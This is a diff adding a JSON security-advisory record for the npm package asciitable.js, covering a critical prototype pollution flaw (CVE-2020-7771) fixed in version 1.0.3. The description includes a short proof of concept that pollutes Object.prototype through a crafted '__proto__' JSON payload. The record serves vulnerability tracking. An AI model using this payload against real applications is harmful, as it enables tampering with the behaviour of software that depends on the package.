@@ -1,0 +1,27 @@
+{
+  "name": "asciitable.js",
+  "lastUpdated": "2026-01-31T15:05:26.294Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-5pxj-mhwj-x5gv",
+      "title": "Prototype Pollution in asciitable.js",
+      "description": "The package asciitable.js before 1.0.3 is vulnerable to Prototype Pollution via the main function.\n\n### PoC\n```js\nvar a = require(\"asciitable.js\"); \nvar b = JSON.parse('{\"__proto__\":{\"test\":123}}'); \na({},b); \nconsole.log({}.test)\n```",
+      "severity": "critical",
+      "url": "https://github.com/advisories/GHSA-5pxj-mhwj-x5gv",
+      "publishedAt": "2021-04-13T15:24:59Z",
+      "modifiedAt": "2023-09-20T05:03:21Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-5pxj-mhwj-x5gv"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2020-7771"
+        }
+      ],
+      "affectedRange": "< 1.0.3",
+      "fixedVersion": "1.0.3"
+    }
+  ]
+}
